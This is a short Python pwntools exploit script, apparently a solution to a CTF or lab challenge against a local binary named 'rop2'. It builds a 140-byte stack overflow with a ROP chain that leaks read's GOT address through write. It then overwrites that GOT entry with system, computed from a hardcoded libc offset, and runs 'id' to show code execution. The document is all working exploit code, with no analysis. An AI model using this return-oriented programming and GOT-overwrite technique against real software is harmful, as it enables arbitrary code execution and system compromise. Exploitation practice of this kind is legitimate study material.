from pwn import *
from time import *

p = process("./rop2")
e = ELF("./rop2")

read_plt,read_got,write_plt = e.plt['read'],e.got['read'],e.plt['write']

not_used = 0x08048610
offset = 0x9d0b0
pppr = 0x0804859d

payload = "A"*140

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)


payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += "AAAA"
payload += p32(not_used)


p.send(payload)
sleep(1)
read = u32(p.recv())
print hex(read)

system = read - offset
p.sendline(p32(system))

p.sendline("id")
print p.recv()
